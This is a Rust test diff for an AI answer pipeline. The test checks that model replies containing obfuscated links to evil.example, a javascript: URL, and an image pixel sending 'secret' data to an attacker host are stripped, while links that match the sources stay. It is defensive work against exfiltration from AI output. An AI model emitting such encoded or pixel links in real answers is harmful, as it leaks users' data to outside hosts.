@@ -1097,3 +1097,46 @@ async fn the_token_budget_covers_the_output_allowance_too() {
     pipe.run(&ledger, prepared).await.unwrap();
     assert_eq!(pipe.provider().call_count(), 1);
 }
+
+#[tokio::test]
+async fn encoded_and_indirect_links_do_not_survive() {
+    let fx = setup();
+    for reply in [
+        "Serif [D-1]. [click](https\\://evil.example/steal)",
+        "Serif [D-1]. [click](https&#58;//evil.example/steal)",
+        "Serif [D-1]. [click](https&colon;//evil.example/steal)",
+        "Serif [D-1]. [click](//evil.example/steal)",
+        "Serif [D-1]. [click](javascript:alert(1))",
+        "Serif [D-1]. [click][r]\n\n[r]: //evil.example/steal",
+        "Serif [D-1]. ![pixel](https://evil.example/steal?d=secret)",
+        "Serif [D-1]. https&#58;//evil.example/steal",
+    ] {
+        let ledger = InMemoryLedger::new();
+        let pipe = pipeline(FakeProvider::fixed(reply));
+        let prepared = pipe
+            .prepare(&fx.store, &ledger, &request("typeface for reading"))
+            .unwrap();
+        let result = pipe.run(&ledger, prepared).await.unwrap();
+        let Answer::Found(found) = &result.answer else {
+            panic!("{reply}: expected an answer, got {:?}", result.answer);
+        };
+        let shown = &found.text;
+        assert!(!shown.contains("evil"), "{reply} -> {shown}");
+        assert!(!shown.contains("javascript"), "{reply} -> {shown}");
+        assert!(!shown.contains("]("), "{reply} -> {shown}");
+        assert_eq!(found.removed_urls, 1, "{reply} -> {shown}");
+    }
+    // A link to a URL that is in the sources stays, in plain view.
+    let ledger = InMemoryLedger::new();
+    let pipe = pipeline(FakeProvider::fixed(
+        "Serif [D-1], licence [here](https://example.org/fonts/license).",
+    ));
+    let prepared = pipe
+        .prepare(&fx.store, &ledger, &request("typeface for reading"))
+        .unwrap();
+    let result = pipe.run(&ledger, prepared).await.unwrap();
+    assert_eq!(
+        result.answer.text(),
+        "Serif [D-1], licence here (https://example.org/fonts/license).\n\nSources: [D-1]"
+    );
+}
